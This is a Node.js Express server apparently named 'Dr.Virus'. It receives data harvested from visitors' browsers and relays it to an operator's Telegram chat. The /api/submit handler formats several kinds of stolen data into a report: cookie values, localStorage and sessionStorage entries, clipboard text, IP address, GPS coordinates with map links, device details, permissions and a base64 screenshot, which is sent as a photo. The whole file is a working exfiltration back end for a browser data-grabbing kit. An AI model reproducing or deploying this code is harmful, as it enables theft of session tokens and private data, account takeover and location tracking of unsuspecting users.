const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || '';
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '';

// ---------- Telegram helpers ----------
async function sendMessage(chatId, text) {
  if (!BOT_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN missing on server');
  const r = await axios.post(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    {
      chat_id: chatId,
      text: String(text).slice(0, 4000),
      parse_mode: 'HTML',
      disable_web_page_preview: true
    },
    { timeout: 25000 }
  );
  return r.data;
}

// multipart manually — no external form-data dependency
async function sendPhoto(chatId, buffer, caption) {
  if (!BOT_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN missing');
  const boundary = '----dv' + Date.now();
  const parts = [];
  const push = s => parts.push(Buffer.from(s, 'utf8'));

  push(`--${boundary}\r\n`);
  push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`);
  push(`--${boundary}\r\n`);
  push(`Content-Disposition: form-data; name="caption"\r\n\r\n${(caption || '').slice(0, 1024)}\r\n`);
  push(`--${boundary}\r\n`);
  push(`Content-Disposition: form-data; name="photo"; filename="screenshot.jpg"\r\n`);
  push(`Content-Type: image/jpeg\r\n\r\n`);
  parts.push(buffer);
  push(`\r\n--${boundary}--\r\n`);

  const body = Buffer.concat(parts);
  const r = await axios.post(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
    body,
    {
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': body.length
      },
      timeout: 25000,
      maxBodyLength: Infinity,
      maxContentLength: Infinity
    }
  );
  return r.data;
}

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function trunc(s, n) {
  s = String(s == null ? '' : s);
  return s.length > n ? s.slice(0, n) + '…' : s;
}

// ---------- POST /api/submit ----------
app.post('/api/submit', async (req, res) => {
  try {
    const { chatId, data } = req.body || {};
    const target = String(chatId || DEFAULT_CHAT_ID || '').trim();
    if (!target) {
      return res.status(400).json({ error: 'chatId missing (set TELEGRAM_CHAT_ID env)' });
    }
    if (!data || typeof data !== 'object') {
      return res.status(400).json({ error: 'data object required' });
    }

    let msg = `<b>🧪 Dr.Virus Report</b>\n`;
    msg += `<i>${new Date().toLocaleString()}</i>\n\n`;

    // ---- Browser ----
    if (data.browser) {
      const b = data.browser;
      msg += `<b>🌐 Browser</b>\n`;
      msg += `UA: <code>${esc(trunc(b.userAgent, 220))}</code>\n`;
      msg += `Platform: ${esc(b.platform || '?')}\n`;
      msg += `Language: ${esc(b.language || '?')}\n`;
      if (b.languages) msg += `Languages: ${esc(trunc(b.languages, 100))}\n`;
      msg += `Screen: ${esc(b.screenWidth)}×${esc(b.screenHeight)}\n`;
      msg += `Viewport: ${esc(b.viewport || '?')}\n`;
      msg += `DPR: ${esc(b.dpr || '?')}\n`;
      msg += `Timezone: ${esc(b.timezone || '?')}\n`;
      msg += `Cookies enabled: ${b.cookiesEnabled}\n`;
      msg += `Online: ${b.online}\n`;
      msg += `Touch points: ${esc(b.touch || 0)}\n\n`;
    }

    // ---- System ----
    if (data.system) {
      const s = data.system;
      msg += `<b>💻 System</b>\n`;
      if (s.cores) msg += `CPU cores: ${esc(s.cores)}\n`;
      if (s.memory) msg += `Device memory: ${esc(s.memory)} GB\n`;
      if (s.battery) msg += `Battery: ${esc(s.battery)}\n`;
      if (s.connection) msg += `Connection: ${esc(s.connection)}\n`;
      msg += '\n';
    }

    // ---- Geo ----
    if (data.geo) {
      const g = data.geo;
      msg += `<b>📍 Location</b>\n`;
      if (g.ip) msg += `IP: <code>${esc(g.ip)}</code>\n`;
      if (g.country) msg += `Country: ${esc(g.country)}\n`;
      if (g.city) msg += `City: ${esc(g.city)}\n`;
      if (g.isp) msg += `ISP: ${esc(g.isp)}\n`;
      if (g.lat && g.lon) {
        msg += `Coords: ${esc(g.lat)}, ${esc(g.lon)}\n`;
        msg += `<a href="https://maps.google.com/?q=${g.lat},${g.lon}">Open in Maps</a>\n`;
      }
      if (g.gpsLat) {
        msg += `GPS: <code>${esc(g.gpsLat.toFixed ? g.gpsLat.toFixed(6) : g.gpsLat)}, ${esc(g.gpsLon.toFixed ? g.gpsLon.toFixed(6) : g.gpsLon)}</code> (±${esc(g.gpsAcc || '?')}m)\n`;
        msg += `<a href="https://maps.google.com/?q=${g.gpsLat},${g.gpsLon}">GPS on Maps</a>\n`;
      }
      msg += '\n';
    }

    // ---- Cookies ----
    if (Array.isArray(data.cookies) && data.cookies.length) {
      msg += `<b>🍪 Cookies (${data.cookies.length})</b>\n`;
      data.cookies.slice(0, 15).forEach(c => {
        msg += `<code>${esc(trunc(c.name, 40))}</code> = ${esc(trunc(c.value, 60))}\n`;
      });
      if (data.cookies.length > 15) msg += `… +${data.cookies.length - 15} more\n`;
      msg += '\n';
    } else {
      msg += `<b>🍪 Cookies:</b> 0\n\n`;
    }

    // ---- localStorage ----
    if (Array.isArray(data.localStorage) && data.localStorage.length) {
      msg += `<b>📦 LocalStorage (${data.localStorage.length})</b>\n`;
      data.localStorage.slice(0, 15).forEach(i => {
        msg += `<code>${esc(trunc(i.key, 40))}</code> = ${esc(trunc(i.value, 60))}\n`;
      });
      if (data.localStorage.length > 15) msg += `… +${data.localStorage.length - 15} more\n`;
      msg += '\n';
    }

    // ---- sessionStorage ----
    if (Array.isArray(data.sessionStorage) && data.sessionStorage.length) {
      msg += `<b>📂 SessionStorage (${data.sessionStorage.length})</b>\n`;
      data.sessionStorage.slice(0, 15).forEach(i => {
        msg += `<code>${esc(trunc(i.key, 40))}</code> = ${esc(trunc(i.value, 60))}\n`;
      });
      if (data.sessionStorage.length > 15) msg += `… +${data.sessionStorage.length - 15} more\n`;
      msg += '\n';
    }

    // ---- Clipboard ----
    if (data.clipboard) {
      msg += `<b>📋 Clipboard</b>\n<code>${esc(trunc(data.clipboard, 500))}</code>\n\n`;
    }

    // ---- Permissions ----
    if (data.permissions && typeof data.permissions === 'object') {
      msg += `<b>🔐 Permissions</b>\n`;
      Object.keys(data.permissions).forEach(k => {
        msg += `${esc(k)}: ${esc(data.permissions[k])}\n`;
      });
      msg += '\n';
    }

    // hard length guard
    if (msg.length > 4000) msg = msg.slice(0, 3950) + '\n…(truncated)';

    await sendMessage(target, msg);

    // ---- Screenshot ----
    if (data.screenshot && typeof data.screenshot === 'string') {
      const m = /^data:image\/(\w+);base64,(.+)$/.exec(data.screenshot);
      if (m) {
        const buf = Buffer.from(m[2], 'base64');
        if (buf.length < 4.5 * 1024 * 1024) {
          try {
            await sendPhoto(target, buf, '📸 Screenshot');
          } catch (e) {
            console.error('sendPhoto failed:', e.message);
          }
        } else {
          console.warn('Screenshot too large:', buf.length);
        }
      }
    }

    res.json({ success: true });
  } catch (e) {
    console.error('submit error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ---------- GET /api/health ----------
app.get('/api/health', (_, res) => {
  res.json({
    status: 'ok',
    botTokenSet: !!BOT_TOKEN,
    chatIdSet: !!DEFAULT_CHAT_ID,
    time: new Date().toISOString()
  });
});

// ---------- local dev ----------
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`🧪 Dr.Virus → http://localhost:${PORT}`);
    console.log(`Telegram bot token: ${BOT_TOKEN ? '✅' : '❌'}`);
    console.log(`Telegram chat ID:   ${DEFAULT_CHAT_ID ? '✅' : '❌'}`);
  });
}

module.exports = app;
